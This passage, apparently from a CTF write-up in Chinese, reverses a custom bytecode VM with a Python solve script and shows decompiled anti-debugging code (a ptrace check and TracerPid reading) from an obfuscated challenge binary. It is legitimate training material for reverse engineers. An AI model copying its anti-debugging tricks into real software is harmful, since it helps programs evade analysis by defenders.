</span></span><span class=line><span class=cl>                <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ip</span><span class=o>+=</span><span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>verdict</span> <span class=o>=</span> <span class=mi>501</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>l</span> 
</span></span><span class=line><span class=cl><span class=c1>#version 330</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#define S(a,b,t) smoothstep(a,b,t)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>uniform</span> <span class=ne>float</span> <span class=n>time</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>out</span> <span class=n>vec4</span> <span class=n>fragColor</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mat2</span> <span class=n>Rot</span><span class=p>(</span><span class=ne>float</span> <span class=n>a</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=ne>float</span> <span class=n>s</span> <span class=o>=</span> <span class=nb>sin</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=ne>float</span> <span class=n>c</span> <span class=o>=</span> <span class=nb>cos</span><span class=p>(</span><span class=n>a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>mat2</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=o>-</span><span class=n>s</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=n>c</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>vec2</span> <span class=nb>hash</span><span class=p>(</span><span class=n>vec2</span> <span class=n>p</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>vec2</span><span class=p>(</span><span class=n>dot</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>vec2</span><span class=p>(</span><span class=mf>2127.1</span><span class=p>,</span> <span class=mf>81.17</span><span class=p>)),</span> <span class=n>dot</span><span class=p>(</span><span class=n>p</span><span class=p>,</span> <span class=n>vec2</span><span class=p>(</span><span class=mf>1269.5</span><span class=p>,</span> <span class=mf>283.37</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>fract</span><span class=p>(</span><span class=nb>sin</span><span class=p>(</span><span class=n>p</span><span class=p>)</span> <span class=o>*</span> <span class=mf>43758.5453</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=ne>float</span> <span class=n>noise</span><span class=p>(</span><span class=n>vec2</span> <span class=n>p</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>vec2</span> <span class=n>i</span> <span class=o>=</span> <span class=nb>floor</span><span class=p>(</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>vec2</span> <span class=n>f</span> <span class=o>=</span> <span class=n>fract</span><span class=p>(</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>vec2</span> <span class=n>u</span> <span class=o>=</span> <span class=n>f</span> <span class=o>*</span> <span class=n>f</span> <span class=o>*</span> <span class=p>(</span><span class=mf>3.0</span> <span class=o>-</span> <span class=mf>2.0</span> <span class=o>*</span> <span class=n>f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>mix</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>mix</span><span class=p>(</span><span class=n>dot</span><span class=p>(</span><span class=o>-</span><span class=mf>1.0</span> <span class=o>+</span> <span class=mf>2.0</span> <span class=o>*</span> <span class=nb>hash</span><span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=n>vec2</span><span class=p>(</span><span class=mf>0.0</span><span class=p>,</span> <span class=mf>0.0</span><span class=p>)),</span> <span class=n>f</span> <span class=o>-</span> <span class=n>vec2</span><span class=p>(</span><span class=mf>0.0</span><span class=p>,</span> <span class=mf>0.0</span><span class=p>)),</span>
</span></span><span class=line><span class=cl>            <span class=n>dot</span><span class=p>(</span><span class=o>-</span><span class=mf>1.0</span> <span class=o>+</span> <span class=mf>2.0</span> <span class=o>*</span> <span class=nb>hash</span><span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=n>vec2</span><span class=p>(</span><span class=mf>1.0</span><span class=p>,</span> <span class=mf>0.0</span><span class=p>)),</span> <span class=n>f</span> <span class=o>-</span> <span class=n>vec2</span><span class=p>(</span><span class=mf>1.0</span><span class=p>,</span> <span class=mf>0.0</span><span class=p>)),</span> <span class=n>u</span><span class=o>.</span><span class=n>x</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=n>mix</span><span class=p>(</span><span class=n>dot</span><span class=p>(</span><span class=o>-</span><span class=mf>1.0</span> <span class=o>+</span> <span class=mf>2.0</span> <span class=o>*</span> <span class=nb>hash</span><span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=n>vec2</span><span class=p>(</span><span class=mf>0.0</span><span class=p>,</span> <span class=mf>1.0</span><span class=p>)),</span> <span class=n>f</span> <span class=o>-</span> <span class=n>vec2</span><span class=p>(</span><span class=mf>0.0</span><span class=p>,</span> <span class=mf>1.0</span><span class=p>)),</span>
</span></span><span class=line><span class=cl>            <span class=n>dot</span><span class=p>(</span><span class=o>-</span><span class=mf>1.0</span> <span class=o>+</span> <span class=mf>2.0</span> <span class=o>*</span> <span class=nb>hash</span><span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=n>vec2</span><span class=p>(</span><span class=mf>1.0</span><span class=p>,</span> <span class=mf>1.0</span><span class=p>)),</span> <span class=n>f</span> <span class=o>-</span> <span class=n>vec2</span><span class=p>(</span><span class=mf>1.0</span><span class=p>,</span> <span class=mf>1.0</span><span class=p>)),</span> <span class=n>u</span><span class=o>.</span><span class=n>x</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=n>u</span><span class=o>.</span><span class=n>y</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span> <span class=o>*</span> <span class=mf>0.5</span> <span class=o>+</span> <span class=mf>0.5</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>vec2</span> <span class=n>uSize</span> <span class=o>=</span> <span class=n>vec2</span><span class=p>(</span><span class=mf>1280.0</span><span class=p>,</span> <span class=mf>800.0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>vec2</span> <span class=n>uv</span> <span class=o>=</span> <span class=n>gl_FragCoord</span><span class=o>.</span><span class=n>xy</span> <span class=o>/</span> <span class=n>uSize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=ne>float</span> <span class=n>ratio</span> <span class=o>=</span> <span class=n>uSize</span><span class=o>.</span><span class=n>x</span> <span class=o>/</span> <span class=n>uSize</span><span class=o>.</span><span class=n>y</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>vec2</span> <span class=n>tuv</span> <span class=o>=</span> <span class=n>uv</span> <span class=o>-</span> <span class=mf>0.5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=ne>float</span> <span class=n>degree</span> <span class=o>=</span> <span class=n>noise</span><span class=p>(</span><span class=n>vec2</span><span class=p>(</span><span class=n>time</span> <span class=o>*</span> <span class=mf>0.1</span><span class=p>,</span> <span class=n>tuv</span><span class=o>.</span><span class=n>x</span> <span class=o>*</span> <span class=n>tuv</span><span class=o>.</span><span class=n>y</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>tuv</span><span class=o>.</span><span class=n>y</span> <span class=o>*=</span> <span class=mf>1.0</span> <span class=o>/</span> <span class=n>ratio</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>tuv</span> <span class=o>*=</span> <span class=n>Rot</span><span class=p>(</span><span class=n>radians</span><span class=p>((</span><span class=n>degree</span> <span class=o>-</span> <span class=mf>0.5</span><span class=p>)</span> <span class=o>*</span> <span class=mf>720.0</span> <span class=o>+</span> <span class=mf>180.0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>tuv</span><span class=o>.</span><span class=n>y</span> <span class=o>*=</span> <span class=n>ratio</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=ne>float</span> <span class=n>frequency</span> <span class=o>=</span> <span class=mf>3.5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=ne>float</span> <span class=n>amplitude</span> <span class=o>=</span> <span class=mf>10.0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=ne>float</span> <span class=n>speed</span> <span class=o>=</span> <span class=n>time</span> <span class=o>*</span> <span class=mf>1.5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>tuv</span><span class=o>.</span><span class=n>x</span> <span class=o>+=</span> <span class=nb>sin</span><span class=p>(</span><span class=n>tuv</span><span class=o>.</span><span class=n>y</span> <span class=o>*</span> <span class=n>frequency</span> <span class=o>+</span> <span class=n>speed</span><span class=p>)</span> <span class=o>/</span> <span class=n>amplitude</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>tuv</span><span class=o>.</span><span class=n>y</span> <span class=o>+=</span> <span class=nb>sin</span><span class=p>(</span><span class=n>tuv</span><span class=o>.</span><span class=n>x</span> <span class=o>*</span> <span class=n>frequency</span> <span class=o>*</span> <span class=mf>1.5</span> <span class=o>+</span> <span class=n>speed</span><span class=p>)</span> <span class=o>/</span> <span class=p>(</span><span class=n>amplitude</span> <span class=o>*</span> <span class=mf>0.5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>vec3</span> <span class=n>color1</span> <span class=o>=</span> <span class=n>vec3</span><span class=p>(</span><span class=mf>0.8</span><span class=p>,</span> <span class=mf>0.4</span><span class=p>,</span> <span class=mf>0.9</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>vec3</span> <span class=n>color2</span> <span class=o>=</span> <span class=n>vec3</span><span class=p>(</span><span class=mf>0.4</span><span class=p>,</span> <span class=mf>0.7</span><span class=p>,</span> <span class=mf>1.0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>vec3</span> <span class=n>color3</span> <span class=o>=</span> <span class=n>vec3</span><span class=p>(</span><span class=mf>1.0</span><span class=p>,</span> <span class=mf>0.6</span><span class=p>,</span> <span class=mf>0.4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>vec3</span> <span class=n>color4</span> <span class=o>=</span> <span class=n>vec3</span><span class=p>(</span><span class=mf>0.6</span><span class=p>,</span> <span class=mf>1.0</span><span class=p>,</span> <span class=mf>0.6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>vec3</span> <span class=n>layer1</span> <span class=o>=</span> <span class=n>mix</span><span class=p>(</span><span class=n>color1</span><span class=p>,</span> <span class=n>color2</span><span class=p>,</span> <span class=n>S</span><span class=p>(</span><span class=o>-</span><span class=mf>0.3</span><span class=p>,</span> <span class=mf>0.2</span><span class=p>,</span> <span class=p>(</span><span class=n>tuv</span> <span class=o>*</span> <span class=n>Rot</span><span class=p>(</span><span class=n>radians</span><span class=p>(</span><span class=o>-</span><span class=mf>5.0</span><span class=p>)))</span><span class=o>.</span><span class=n>x</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>vec3</span> <span class=n>layer2</span> <span class=o>=</span> <span class=n>mix</span><span class=p>(</span><span class=n>color3</span><span class=p>,</span> <span class=n>color4</span><span class=p>,</span> <span class=n>S</span><span class=p>(</span><span class=o>-</span><span class=mf>0.3</span><span class=p>,</span> <span class=mf>0.2</span><span class=p>,</span> <span class=p>(</span><span class=n>tuv</span> <span class=o>*</span> <span class=n>Rot</span><span class=p>(</span><span class=n>radians</span><span class=p>(</span><span class=o>-</span><span class=mf>5.0</span><span class=p>)))</span><span class=o>.</span><span class=n>x</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>vec3</span> <span class=n>finalColor</span> <span class=o>=</span> <span class=n>mix</span><span class=p>(</span><span class=n>layer1</span><span class=p>,</span> <span class=n>layer2</span><span class=p>,</span> <span class=n>S</span><span class=p>(</span><span class=mf>0.5</span><span class=p>,</span> <span class=o>-</span><span class=mf>0.3</span><span class=p>,</span> <span class=n>tuv</span><span class=o>.</span><span class=n>y</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fragColor</span> <span class=o>=</span> <span class=n>vec4</span><span class=p>(</span><span class=n>finalColor</span><span class=p>,</span> <span class=mf>1.0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>分析虚拟机的字节码的作用如下：</p><p>2, x → PUSH co_consts[x]</p><p>7, 0 → ADD</p><p>8, 0 → SUB</p><p>14, 0 → XOR</p><p>15 ,x→CMP_EQ (y == x)</p><p>16 → CHECK（对前16个栈值与 cipher-20 比较）</p><p>18，addr→ JMP_IF_ZERO addr</p><p>由开头的layout可以对应到源程序里的初始化区域</p><p><img src=https://su-team.cn/img/2025-L3HCTF/60c3e82d-beab-42dd-9013-49cd331d2be9.png alt=img></p><p>向上继续溯源可以找到真正初始化数据的位置</p><p><img src=https://su-team.cn/img/2025-L3HCTF/c791a1be-391d-4aee-b9f9-cf64a21a4e07.png alt=img></p><p>提出来所有的opcodes，如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>2,0,
</span></span><span class=line><span class=cl>2,1,2,0,14,0,2,16,8,0,
</span></span><span class=line><span class=cl>2,2,2,1,14,0,2,17,8,0,
</span></span><span class=line><span class=cl>2,3,2,2,14,0,2,18,7,0,
</span></span><span class=line><span class=cl>2,4,2,3,14,0,2,19,7,0,
</span></span><span class=line><span class=cl>2,5,2,4,14,0,2,20,8,0,
</span></span><span class=line><span class=cl>2,6,2,5,14,0,2,21,7,0,
</span></span><span class=line><span class=cl>2,7,2,6,14,0,2,22,7,0,
</span></span><span class=line><span class=cl>2,8,2,7,14,0,2,23,7,0,
</span></span><span class=line><span class=cl>2,9,2,8,14,0,2,24,7,0,
</span></span><span class=line><span class=cl>2,10,2,9,14,0,2,25,7,0,
</span></span><span class=line><span class=cl>2,11,2,10,14,0,2,26,7,0,
</span></span><span class=line><span class=cl>2,12,2,11,14,0,2,27,8,0,
</span></span><span class=line><span class=cl>2,13,2,12,14,0,2,28,8,0,
</span></span><span class=line><span class=cl>2,14,2,13,14,0,2,29,7,0,
</span></span><span class=line><span class=cl>2,15,2,14,14,0,2,30,8,0,
</span></span><span class=line><span class=cl>16,0,
</span></span><span class=line><span class=cl>2,16,2,17,15,0,18,84,
</span></span><span class=line><span class=cl>2,31,1,0,3,1
</span></span></code></pre></td></tr></table></div></div><p>解析一下每一组的操作</p><p>2,0, //PUSH co_consts[0]</p><p>2,1, // PUSH co_consts[1]</p><p>14,0, // XOR</p><p>2,16, // PUSH co_consts[16]</p><p>8,0 // SUB</p><p>最后的比较是和cipher[i]-20进行比较</p><p>最后可以写出exp如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>CIPHER</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0xF3</span><span class=p>,</span> <span class=mh>0x82</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x1FD</span><span class=p>,</span> <span class=mh>0x150</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0xB2</span><span class=p>,</span> <span class=mh>0xDE</span><span class=p>,</span> <span class=mh>0x15A</span><span class=p>,</span> <span class=mh>0x197</span><span class=p>,</span> <span class=mh>0x9C</span><span class=p>,</span> <span class=mh>0x1D7</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x146</span><span class=p>,</span>
</span></span><span class=line><span class=cl>          <span class=mh>0x97</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>CONSTS</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0xB0</span><span class=p>,</span> <span class=mh>0xC8</span><span class=p>,</span> <span class=mh>0xFA</span><span class=p>,</span> <span class=mh>0x86</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x8F</span><span class=p>,</span> <span class=mh>0xAF</span><span class=p>,</span> <span class=mh>0xBF</span><span class=p>,</span> <span class=mh>0xC9</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0xD7</span><span class=p>,</span> <span class=mh>0xC3</span><span class=p>,</span> <span class=mh>0xE3</span><span class=p>,</span> <span class=mh>0xEF</span><span class=p>,</span> <span class=mh>0x87</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>op_pattern</span> <span class=o>=</span> <span class=p>[</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>targets</span> <span class=o>=</span> <span class=p>[</span><span class=n>c</span> <span class=o>-</span> <span class=mi>20</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>CIPHER</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>inputs</span> <span class=o>=</span> <span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>*</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>inputs</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>targets</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>prev_input</span> <span class=o>=</span> <span class=n>inputs</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>target</span> <span class=o>=</span> <span class=n>targets</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>const</span> <span class=o>=</span> <span class=n>CONSTS</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>op_type</span> <span class=o>=</span> <span class=n>op_pattern</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>op_type</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>  <span class=c1># ADD</span>
</span></span><span class=line><span class=cl>        <span class=n>intermediate</span> <span class=o>=</span> <span class=p>(</span><span class=n>target</span> <span class=o>-</span> <span class=n>const</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>op_type</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>  <span class=c1># SUB</span>
</span></span><span class=line><span class=cl>        <span class=n>intermediate</span> <span class=o>=</span> <span class=p>(</span><span class=n>const</span> <span class=o>-</span> <span class=n>target</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xff</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>inputs</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>intermediate</span> <span class=o>^</span> <span class=n>prev_input</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>bytes</span><span class=p>(</span><span class=n>inputs</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=obfuscate>obfuscate</h2><p>ida反编译错误，main有爆红，不用管直接分析其他函数，分别找到如下函数</p><p>首先是3处反调试</p><ol><li>ptrace</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kr>__int64</span> <span class=nf>sub_7E20</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>result</span> <span class=o>=</span> <span class=nf>ptrace</span><span class=p>(</span><span class=n>PTRACE_TRACEME</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>result</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nf>_exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ol><li>读取文件Tracerid值（动调跟进解密后的字符串可以看到Tracerid）</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kr>__int64</span> <span class=kr>__fastcall</span> <span class=nf>sub_7EC0</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>140</span><span class=p>];</span> <span class=c1>// [rsp+10h] [rbp-D0h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// [rsp+9Ch] [rbp-44h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>FILE</span> <span class=o>*</span><span class=n>stream</span><span class=p>;</span> <span class=c1>// [rsp+A0h] [rbp-40h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=o>*</span><span class=n>needle</span><span class=p>;</span> <span class=c1>// [rsp+A8h] [rbp-38h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v7</span><span class=p>;</span> <span class=c1>// [rsp+B4h] [rbp-2Ch] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>filename</span><span class=p>[</span><span class=mi>18</span><span class=p>];</span> <span class=c1>// [rsp+BAh] [rbp-26h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v9</span><span class=p>;</span> <span class=c1>// [rsp+CCh] [rbp-14h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>modes</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span> <span class=c1>// [rsp+D2h] [rbp-Eh] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v11</span><span class=p>;</span> <span class=c1>// [rsp+D4h] [rbp-Ch] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v12</span><span class=p>;</span> <span class=c1>// [rsp+DAh] [rbp-6h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int16</span> <span class=n>v13</span><span class=p>;</span> <span class=c1>// [rsp+DEh] [rbp-2h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v12</span> <span class=o>=</span> <span class=mi>1053795514</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v13</span> <span class=o>=</span> <span class=o>-</span><span class=mi>10245</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v11</span> <span class=o>=</span> <span class=mi>468703135</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>xor_dec</span><span class=p>(</span><span class=o>&amp;</span><span class=n>v12</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v11</span><span class=p>,</span> <span class=mi>6LL</span><span class=p>,</span> <span class=mi>4LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>modes</span> <span class=o>=</span> <span class=mi>29201</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v9</span> <span class=o>=</span> <span class=mi>233665123</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>xor_dec</span><span class=p>(</span><span class=n>modes</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v9</span><span class=p>,</span> <span class=mi>2LL</span><span class=p>,</span> <span class=mi>4LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>qmemcpy</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s>&#34;uU </span><span class=se>\\</span><span class=s>9</span><span class=se>\n</span><span class=s>!V6C}@.D&amp;F)%&#34;</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>filename</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=mi>861021530</span><span class=p>;</span>
